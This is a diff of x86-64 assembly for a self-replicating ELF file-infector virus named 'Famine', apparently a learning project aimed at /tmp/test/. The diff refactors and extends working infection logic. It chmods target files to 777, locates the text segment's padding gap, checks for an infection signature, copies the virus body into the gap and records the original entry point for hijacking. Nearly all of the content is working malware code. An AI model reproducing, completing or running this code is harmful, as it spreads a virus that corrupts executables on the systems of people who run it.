@@ -1,5 +1,5 @@
 
-; 791 bytes
+; 766 bytes
 
 %include "famine.inc"
 
@@ -41,10 +41,10 @@ _start:
 ; ##### LOOP THROUGH TARGET DIRECTORIES #####
 
 _traverse_dir:
-	; === ===
+	; === Opening target directory ===
 	mov r12, rdi					; Saving name of directory in r12
 	mov rax, SYS_OPEN
-	mov rsi, O_RDONLY
+	mov rsi, O_RDONLY | O_DIRECTORY
 	xor rdx, rdx
 	syscall
 	cmp rax, 0
@@ -105,6 +105,12 @@ _file:
 		movsb
 		cmp byte [rsi - 1], 0
 		jne .fname
+	
+	; === chmod 777 on the file to infect, to ensure we have read-write permissions on it ===
+	lea rdi, FAM(famine.current_fpath)
+	mov rsi, 0q0777
+	mov rax, SYS_CHMOD
+	syscall
 
 	mov rdi, rdx
 	mov rax, SYS_OPEN
@@ -112,7 +118,7 @@ _file:
 	xor rdx, rdx
 	syscall
 	mov r8, rax													; r8 will have fd (for mmap)
-	cmp rax, 0													; Error checking (open failed)
+	cmp rax, 0
 	jl check_dir_loop
 
 	; === Calculate the size of the file with lseek ===
@@ -144,14 +150,11 @@ _file:
 	cmp byte [rax + 0x4], 0x2
 	jne check_dir_loop
 
-	; === Getting the segments offset in file ===
-	add rax, elf64_ehdr.e_phoff
-
 	; === Finding the text segment in file ===
-	mov r11, [rax]												; Storing e_phoff in r11
-	mov rax, FAM(famine.map_ptr)
 	mov r14, rax
-	add r14, elf64_ehdr.e_phnum
+	add r14, elf64_ehdr.e_phoff
+	mov r11, [r14]
+	add r14, elf64_ehdr.e_phnum -  elf64_ehdr.e_phoff
 	movzx r14, word [r14]										; Storing e_phnum in r14
 
 	dec r14														; Decrementing by 1 since our counter starts at 0
@@ -166,8 +169,8 @@ _file:
 		jmp _phnum_loop
 	_found_text_segment:
 		add rax, elf64_phdr.p_offset
-		mov rdi, [rax]
-		mov FAM(famine.txt_offset), rdi
+		mov r13, [rax]
+		mov FAM(famine.txt_offset), r13
 
 		add rax, elf64_phdr.p_vaddr - elf64_phdr.p_offset
 		mov rdi, [rax]
@@ -176,38 +179,34 @@ _file:
 		add rax, elf64_phdr.p_filesz - elf64_phdr.p_vaddr
 		mov rdi, [rax]
 		mov FAM(famine.txt_filesz), rdi
+		add rdi, r13
+		mov FAM(famine.injection_pt), rdi
 
 		add rax, elf64_phdr_size - (elf64_phdr.p_filesz - elf64_phdr.p_offset)
-		mov rdi, [rax]
-		mov FAM(famine.next_offset), rdi
+		mov rbx, [rax]
+		mov rsi, FAM(famine.injection_pt)
+		sub rbx, rsi
+		mov FAM(famine.gap_size), rbx
 
 	; === Is the file already infected ? ===
 	mov rdi, FAM(famine.map_ptr)
-	add rdi, FAM(famine.txt_offset)
-	add rdi, FAM(famine.txt_filesz)
+	add rdi, FAM(famine.injection_pt)
 	add rdi, VIRUS_SIZE
 	sub rdi, (_finish - signature)
 	mov rax, [rel signature]
 	cmp rax, qword [rdi]
 	je check_dir_loop
 
-	; === Calculating the space available in padding gap ===
-	mov rsi, FAM(famine.next_offset)
-	mov rdi, FAM(famine.txt_offset)
-	add rdi, FAM(famine.txt_filesz)
-	sub rsi, rdi
-	mov FAM(famine.gap_size), rsi
-
 	; === Comparing gap size and virus size ===
 	mov rdi, VIRUS_SIZE
-	cmp rdi, rsi
+	cmp qword rdi, FAM(famine.gap_size)
 	jg check_dir_loop
 
 	; === Patch ELF entry point ===
 	mov rax, FAM(famine.map_ptr)
 	add rax, elf64_ehdr.e_entry
 	mov rsi, [rax]
-	mov FAM(famine.orig_entry), rsi
+	mov r14, rsi													; original entry point in r14
 	mov rdi, FAM(famine.txt_vaddr)
 	add rdi, FAM(famine.txt_filesz)
 	mov r13, rdi
@@ -215,14 +214,12 @@ _file:
 	
 	; === Writing virus from injection point ===
 	mov rdi, FAM(famine.map_ptr)
-	add rdi, FAM(famine.txt_offset)
-	add rdi, FAM(famine.txt_filesz)								; rdi at injection point
+	add rdi, FAM(famine.injection_pt)							; rdi at injection point
 	lea rsi, [rel _start]										; rsi at start of virus
 	mov rcx, VIRUS_SIZE											; Copy whole virus to injection point
-	repnz movsb
+	rep movsb
 
 	mov qword [rdi - 8], r13
-	mov r14, FAM(famine.orig_entry)
 	mov qword [rdi - 16], r14
 
 	jmp check_dir_loop
@@ -246,7 +243,6 @@ _return:
 
 _exit:
 	mov rax, SYS_EXIT
-	mov rdi, 0
 	syscall
 
 target_1	db		"/tmp/test/",0x0
